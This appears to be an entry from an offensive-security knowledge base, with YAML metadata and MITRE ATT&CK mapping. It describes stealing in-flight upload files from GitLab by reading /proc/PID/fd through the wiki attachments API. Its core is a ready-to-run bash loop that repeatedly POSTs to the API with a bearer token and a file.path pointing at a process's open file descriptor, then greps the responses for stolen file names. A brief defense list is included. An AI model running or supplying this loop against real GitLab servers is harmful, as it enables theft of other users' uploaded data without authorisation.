---
tags:
  - file-theft
  - proc-fd
  - gitlab
type: procedure
tools:
  - '[[tools/sudo]]'
tactics:
  - '[[Collection]]'
  - '[[Discovery]]'
commands: []
platforms:
  - Linux
  - GitLab
techniques:
  - '[[Data from Local System]]'
  - '[[File and Directory Discovery]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 3bd31480-fe09-4e21-a697-afb884138f32
created_at: '2025-12-11T03:47:39.421Z'
updated_at: '2025-12-11T03:47:39.421Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0009]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1005]]'
  - '[[T1083]]'
---
# Steal Inflight Files Using /proc/fd in Loop

## Summary

This procedure uses looped requests to read open file descriptors via /proc/PID/fd, stealing temporary upload files.

## Description

By targeting known PIDs and fd numbers, attackers can intercept inflight uploads before they are processed, leading to sensitive data exfiltration in GitLab environments.

## Requirements
1. Leaked PID from prior steps
2. API token
3. curl for automated looping

## Defense

- Restrict /proc access
- Monitor for looped API calls
- Use secure temporary file handling

## Objectives
1. Exfiltrate open files
2. Demonstrate real-time theft
3. Achieve data disclosure

## Instructions

### Step 1: Run Theft Loop

**Context**: Continuously attempt to read fd.

**Command** ([[commands/curl-loop-steal-fd]]):
```bash
while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt' | grep file_name; done
```

> Loops requests, grepping for file names from stolen uploads.

## MITRE ATT&CK Mapping

### Tactics
- [[Collection]]
- [[Discovery]]

### Techniques
- [[Data from Local System]]
- [[File and Directory Discovery]]

### Sub-Techniques
- None

## Commands Used
- [[commands/curl-loop-steal-fd]]

## Tools Used
- #curl

## Tags
- #file-theft
- #proc-fd
- #gitlab
